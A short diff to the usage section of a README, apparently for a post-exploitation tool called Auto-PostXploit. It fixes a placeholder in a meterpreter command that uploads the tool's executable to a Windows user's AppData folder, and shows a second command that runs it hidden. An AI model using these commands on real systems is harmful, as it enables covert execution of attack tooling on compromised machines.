@@ -15,7 +15,7 @@
 ## Usage :
 
   
-    meterpreter > upload %path%/Auto-PostXploit.exe C:/Users/*USETNAME*/AppData
+    meterpreter > upload %path%/Auto-PostXploit.exe C:/Users/%USETNAME%/AppData
   
     meterpreter > execute -H -f C:/Users/%USERNAME%/AppData/Auto-PostXploit.exe
   
